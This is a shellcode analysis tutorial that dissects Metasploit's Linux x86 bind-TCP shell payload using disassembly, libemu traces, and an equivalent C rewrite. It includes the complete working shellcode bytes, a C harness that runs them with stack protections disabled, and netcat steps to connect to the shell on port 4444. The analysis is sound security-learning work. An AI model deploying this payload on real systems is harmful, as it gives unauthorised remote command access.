## Metasploit Shellcode Analysis (shell_bind_tcp)

Payload:
linux/x86/shell_bind_tcp

Description:
Listen for a connection over IPv4 and spawn a command shell

Initial disassembly of payload:
Using metasploit to provide the payload for analysis the following will download and disassemble it.
```bash
$ sudo msfpayload -p linux/x86/shell_bind_tcp R | ndisasm -u –
```
```nasm	
00000000  31DB              xor ebx,ebx
00000002  F7E3              mul ebx
00000004  53                push ebx
00000005  43                inc ebx
00000006  53                push ebx
00000007  6A02              push byte +0x2
00000009  89E1              mov ecx,esp
0000000B  B066              mov al,0x66
0000000D  CD80              int 0x80
0000000F  5B                pop ebx
00000010  5E                pop esi
00000011  52                push edx
00000012  680200115C        push dword 0x5c110002
00000017  6A10              push byte +0x10
00000019  51                push ecx
0000001A  50                push eax
0000001B  89E1              mov ecx,esp
0000001D  6A66              push byte +0x66
0000001F  58                pop eax
00000020  CD80              int 0x80
00000022  894104            mov [ecx+0x4],eax
00000025  B304              mov bl,0x4
00000027  B066              mov al,0x66
00000029  CD80              int 0x80
0000002B  43                inc ebx
0000002C  B066              mov al,0x66
0000002E  CD80              int 0x80
00000030  93                xchg eax,ebx
00000031  59                pop ecx
00000032  6A3F              push byte +0x3f
00000034  58                pop eax
00000035  CD80              int 0x80
00000037  49                dec ecx
00000038  79F8              jns 0x32
0000003A  682F2F7368        push dword 0x68732f2f
0000003F  682F62696E        push dword 0x6e69622f
00000044  89E3              mov ebx,esp
00000046  50                push eax
00000047  53                push ebx
00000048  89E1              mov ecx,esp
0000004A  B00B              mov al,0xb
0000004C  CD80              int 0x80
```
Initial analysis of payload with libemu:
Using libemu to discover what is the task of the shellcode. The following command will provide a very verbose trace of execution, the output from which will be used in shortened form below.
```bash
$ sudo msfpayload -p linux/x86/shell_bind_tcp R | sctest -vvv -Ss 1000000
```
```c	
verbose = 3
int socket (
     int domain = 2;
     int type = 1;
     int protocol = 0;
) =  14;
 
int bind (
     int sockfd = 14;
     struct sockaddr_in * my_addr = 0x00416fc2 =>
         struct   = {
             short sin_family = 2;
             unsigned short sin_port = 23569 (port=4444);
             struct in_addr sin_addr = {
                 unsigned long s_addr = 0 (host=0.0.0.0);
             };
             char sin_zero = "       ";
         };
     int addrlen = 16;
) =  0;
int listen (
     int s = 14;
     int backlog = 0;
) =  0;
int accept (
     int sockfd = 14;
     sockaddr_in * addr = 0x00000000 =>
         none;
     int addrlen = 0x00000010 =>
         none;
) =  19;
int dup2 (
     int oldfd = 19;
     int newfd = 0;
) =  0;
int execve (
     const char * dateiname = 0x00416fb2 =>
           = "/bin//sh";
     const char * argv[] = [
           = 0x00416faa =>
               = 0x00416fb2 =>
                   = "/bin//sh";
           = 0x00000000 =>
             none;
     ];
     const char * envp[] = 0x00000000 =>
         none;
) =  0;
```
Produce execution flowchart:
To produce an execution flowchart of the shellcode payload the following commands are issued.
```bash
$ sudo msfpayload -p linux/x86/shell_bind_tcp R | sctest -vvv -Ss 1000000 -G shell_bind_tcp.dot
$ dot shell_bind_tcp.dot -Tpng -o shell_bind_tcp.png
```
This will produce the following flowchart.

![alt text](https://github.com/71FuDD/metasploit-shellcode-analysis-shell_bind_tcp/blob/master/img/shell_bind_tcp.png "Shellcode Analysis Flowchart")

The benefit of such a flowchart is that modularization of the analysis becomes much simpler, the modularization started in the previous step ,the initial libemu analysis, but is confirmed in more detail within the execution flowchart. From here a more detailed analysis and merge of the libemu and disassembly can begin in earnest.

Modularize initial payload disassembly, using libemu and execution flowchart:
```nasm	
; clear registers
00000000  31DB              xor ebx,ebx
00000002  F7E3              mul ebx
 
; socket:
; int socket(int domain, int type, int protocol);
;
; libemu:
;   int domain = 2;
;   int type = 1;
;   int protocol = 0;
00000004  53                push ebx        ; IPPROTO_IP=0
00000005  43                inc ebx         ; socketcall, SYS_SOCKET
00000006  53                push ebx        ; SOCK_STREAM
00000007  6A02              push byte +0x2  ; AF_INET
00000009  89E1              mov ecx,esp     ; ecx, ptr to args
0000000B  B066              mov al,0x66     ; socketcall()
0000000D  CD80              int 0x80        ; make the call
 
; bind:
; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
;
; libemu:
;   int sockfd = 14;
;   struct sockaddr_in * my_addr = 0x00416fc2 =>
;       struct   = {
;           short sin_family = 2;
;               unsigned short sin_port = 23569 (port=4444);
;               struct in_addr sin_addr = {
;                   unsigned long s_addr = 0 (host=0.0.0.0);
;               };
;               char sin_zero = "       ";
;       };
;   int addrlen = 16;
0000000F  5B                pop ebx         ; bind()
00000010  5E                pop esi         ; esi, contains sockfd
00000011  52                push edx        ; sin_addr (INADDR_ANY)
00000012  680200115C        push dword 0x5c110002 ; sin_port/sin_family
00000017  6A10              push byte +0x10 ; addrlen
00000019  51                push ecx        ; my_addr
0000001A  50                push eax        ; sockfd
0000001B  89E1              mov ecx,esp     ; ecx, ptr to args
0000001D  6A66              push byte +0x66 ; socketcall()
0000001F  58                pop eax         ; eax, socketcall()
00000020  CD80              int 0x80        ; make the call
 
; listen:
; int listen(int sockfd, int backlog);
;
; libemu:
;   int listen (
;       int s = 14;
;       int backlog = 0;
;   )
00000022  894104            mov [ecx+0x4],eax ;backlog -ecx,ptr to args
00000025  B304              mov bl,0x4      ; listen()
00000027  B066              mov al,0x66     ; socketcall()
00000029  CD80              int 0x80        ; make the call
 
; accept:
; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
;
; libemu:
;   int accept (
;       int sockfd = 14;
;       sockaddr_in * addr = 0x00000000 =>
;           none;
;       int addrlen = 0x00000010 =>
;           none;
;   )
0000002B  43                inc ebx         ; accept() -ecx,ptr to args
0000002C  B066              mov al,0x66     ; socketcall()
0000002E  CD80              int 0x80        ; make the call
 
; dup2:
; int dup2(int oldfd, int newfd);
;
; libemu:
;   int dup2 (
;       int oldfd = 19;
;       int newfd = 0;
;   )
00000030  93                xchg eax,ebx    ; exchange ebx with eax
00000031  59                pop ecx         ; counter
LBL1:
00000032  6A3F              push byte +0x3f ; dup2()
00000034  58                pop eax         ; dup2()
00000035  CD80              int 0x80        ; make the call
00000037  49                dec ecx         ; sub 1 from counter
00000038  79F8              jns LBL1        ; loop until zero
 
; execve
; int execve(const char *filename, char *const argv[],
;   char *const envp[]);
;
; libemu:
;   int execve (
;       const char * dateiname = 0x00416fb2 =>
;           = "/bin//sh";
;       const char * argv[] = [
;           = 0x00416faa =>
;               = 0x00416fb2 =>
;                   = "/bin//sh";
;           = 0x00000000 =>
;               none;
;       ];
;       const char * envp[] = 0x00000000 =>
;           none;
;   )
0000003A  682F2F7368        push dword 0x68732f2f ; hs//
0000003F  682F62696E        push dword 0x6e69622f ; nib/
00000044  89E3              mov ebx,esp     ; ebx, addr of /bin//sh
00000046  50                push eax        ; null
00000047  53                push ebx        ; ptr to /bin//sh
00000048  89E1              mov ecx,esp     ; ecx, ptr to args
0000004A  B00B              mov al,0xb      ; execve()
0000004C  CD80              int 0x80        ; make the call
```
With the above breakdown of the code it is much easier to get a handle on what is happening within the code. It can be discovered from the above code that it is a standard socket program and is safe to test, the port used within the code being 4444. To prove this it would be beneficial to try and write a C language program equivalent to the shellcode that has just been analyzed.
```c	
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
  
int
main(void)
{
    int sockfd, dupsockfd; 
    struct sockaddr_in hostaddr, clientaddr;  
    socklen_t sinsz;
      
    /*
     socket:
     int socket(int domain, int type, int protocol);
 
     libemu
       int domain = 2;
         int type = 1;
         int protocol = 0;
     00000004  53            push ebx    ; IPPROTO_IP=0
     00000005  43            inc ebx     ; socketcall, SYS_SOCKET    
     00000006  53            push ebx    ; SOCK_STREAM  
     00000007  6A02          push byte +0x2 ; AF_INET
     00000009  89E1          mov ecx,esp ; ecx, ptr to args
     0000000B  B066          mov al,0x66 ; socketcall()
     0000000D  CD80          int 0x80    ; make the call
    */
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
  
    /* 
     bind:
     int bind(int sockfd, const struct sockaddr *addr, 
              socklen_t addrlen);
 
     libemu:
       int sockfd = 14;
       struct sockaddr_in * my_addr = 0x00416fc2 => 
         struct = {
           short sin_family = 2;
           unsigned short sin_port = 23569 (port=4444);
           struct in_addr sin_addr = {
             unsigned long s_addr = 0 (host=0.0.0.0);
           };
           char sin_zero = "       ";
         };
     int addrlen = 16;    
     0000000F  5B            pop ebx        ; bind()
     00000010  5E            pop esi        ; esi, contains sockfd
     00000011  52            push edx       ; null
     00000012  680200115C    push dword 0x5c110002 ; sin_port/sin_family
     00000017  6A10          push byte +0x10 ; addrlen
     00000019  51            push ecx       ; my_addr
     0000001A  50            push eax       ; sockfd
     0000001B  89E1          mov ecx,esp    ; ecx, ptr to args
     0000001D  6A66          push byte +0x66 ; socketcall()
     0000001F  58            pop eax        ; eax, socketcall()
     00000020  CD80          int 0x80       ; make the call
    */
    hostaddr.sin_family = AF_INET;        
    hostaddr.sin_port = htons(4444);     
    hostaddr.sin_addr.s_addr = INADDR_ANY;
    memset(&(hostaddr.sin_zero), '\0', 8);
    bind(sockfd, (struct sockaddr *)&hostaddr,
        sizeof(struct sockaddr));
      
    /*
     listen:
     int listen(int sockfd, int backlog);
 
     libemu:
       int listen (
         int s = 14;
         int backlog = 0;
       )
     00000022  894104        mov [ecx+0x4],eax ;backlog -ecx,ptr to args
     00000025  B304          mov bl,0x4     ; listen()
     00000027  B066          mov al,0x66    ; socketcall()
     00000029  CD80          int 0x80       ; make the call    
    */
    listen(sockfd, 1);
      
    /*
     accept:
     int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
     
     libemu:
       int accept (
         int sockfd = 14;
         sockaddr_in * addr = 0x00000000 => 
           none;
         int addrlen = 0x00000010 => 
           none;
        )
     0000002B  43            inc ebx        ; accept() -ecx,ptr to args
     0000002C  B066          mov al,0x66    ; socketcall()
     0000002E  CD80          int 0x80       ; make the call
    */
    sinsz = sizeof(struct sockaddr_in);
    dupsockfd = accept(sockfd,
        (struct sockaddr *)&clientaddr, &sinsz);
  
    /*
     dup2:
     int dup2(int oldfd, int newfd);
     
     libemu:
       int dup2 (
         int oldfd = 19;
         int newfd = 0;
       )
     00000030  93            xchg eax,ebx    ; exchange ebx with eax
     00000031  59            pop ecx         ; counter
     LBL1:
     00000032  6A3F          push byte +0x3f ; dup2()
     00000034  58            pop eax         ; dup2()
     00000035  CD80          int 0x80        ; make the call
     00000037  49            dec ecx         ; sub 1 from counter
     00000038  79F8          jns LBL1        ; loop until zero    
     
     it is easier to write out the call three times than loop
    */
    dup2(dupsockfd,0); // stdin
    dup2(dupsockfd,1); // stdout
    dup2(dupsockfd,2); // stderr
  
    /*
     execve
     int execve(const char *filename, char *const argv[],
                char *const envp[]);
     
     libemu:
       int execve (
         const char * dateiname = 0x00416fb2 => 
           = "/bin//sh";
             const char * argv[] = [
               = 0x00416faa => 
                 = 0x00416fb2 => 
                   = "/bin//sh";
                 = 0x00000000 => 
                   none;
             ];
         const char * envp[] = 0x00000000 => 
           none;
       )
     0000003A  682F2F7368    push dword 0x68732f2f  ; hs//
     0000003F  682F62696E    push dword 0x6e69622f  ; nib/
     00000044  89E3          mov ebx,esp    ; ebx, addr of /bin//sh
     00000046  50            push eax       ; null
     00000047  53            push ebx       ; ptr to /bin//sh
     00000048  89E1          mov ecx,esp    ; ecx, ptr to args
     0000004A  B00B          mov al,0xb     ; execve()
     0000004C  CD80          int 0x80       ; make the call
    */
    execve("/bin/sh", NULL, NULL);
}
```
Build the code:
```
$ gcc shellcode-in-c.c -o shellcode-in-c
```
Test above executable on localhost using netcat:
Open a terminal under working directory,
```
$ ./shellcode-in-c
```
Open another terminal,
```
$ nc localhost 4444
```
commands can now be executed in this terminal e.g. try typing ls to see contents of the directory.

The next step will be to build and test the shellcode from scratch using the initial disassembly of the shellcode.

Prepare disassembly for compilation:
```nasm
global _start
section .text
_start:
    xor ebx,ebx
    mul ebx
    push ebx
    inc ebx
    push ebx
    push byte +0x2
    mov ecx,esp
    mov al,0x66
    int 0x80
    pop ebx
    pop esi
    push edx
    push dword 0x5c110002
    push byte +0x10
    push ecx
    push eax
    mov ecx,esp
    push byte +0x66
    pop eax
    int 0x80
    mov [ecx+0x4],eax
    mov bl,0x4
    mov al,0x66
    int 0x80
    inc ebx
    mov al,0x66
    int 0x80
    xchg eax,ebx
    pop ecx
stdinouterr:              
    push byte +0x3f
    pop eax
    int 0x80
    dec ecx
    jns stdinouterr
    push dword 0x68732f2f
    push dword 0x6e69622f
    mov ebx,esp
    push eax
    push ebx
    mov ecx,esp
    mov al,0xb
    int 0x80
```
Build the code:
```
$ nasm -felf32 -o shell_bind_tcp.o shell_bind_tcp.asm
$ ld -o shell_bind_tcp shell_bind_tcp.o
```
There is no need to check for nulls within the code as it can be seen from the initial disassembly that there are none.

Get shellcode from executable:
Use the following from the commandlinefu website replacing PROGRAM with the name of the required executable like so,
```bash
$ objdump -d ./shell_bind_tcp | grep ‘[0-9a-f]:’ | grep -v ‘file’ | cut -f2 -d: | cut -f1-6 -d’ ‘ | tr -s ‘ ‘ | tr ‘t’ ‘ ‘ | sed ‘s/ $//g’ | sed ‘s/ /x/g’ | paste -d ” -s | sed ‘s/^/”/’ | sed ‘s/$/”/g’

“\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80”
```
You may notice that there is indeed a null byte in the above shellcode, it pertains to this code:
```nasm	
680200115C        push dword 0x5c110002 ; sin_port/sin_family
```
This particular byte is part of an immediate dword value and execution of the code will treat it as such.

The shellcode can be copied and pasted into a test program similar to the one below.
```c	
#include <stdio.h>
 
unsigned char code[] = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e"
"\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80"
"\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a"
"\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
 
main()
{
    printf("Shellcode Length: %d\n", sizeof(code)-1);
    int (*ret)() = (int(*)())code;
    ret();
}
```
Build the code:
```
$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
```
The options for gcc are to disable stack protection and enable stack execution respectively. Without these options the code will cause a segfault.

Test above executable on localhost using netcat:
Open a terminal under working directory,
```
$ ./shellcode
```
Open another terminal,
```
$ nc localhost 4444
```
commands can now be executed in this terminal e.g. try typing ls to see contents of shellcode directory.

In closing it is noticable that a debugger such as gdb was not used in this analysis, this was intentional as the shellcode was not that complex and with preparation proved to be quite simple to dissect and understand. Not using a debugger also requires a bit more thought as to what is happening within the code, leading to a deeper understanding of not only the shellcode but assembly language itself. Understand that this is not always the case, more complex shellcode can become very laborious and frustrating to analyse without the use of a debugger.
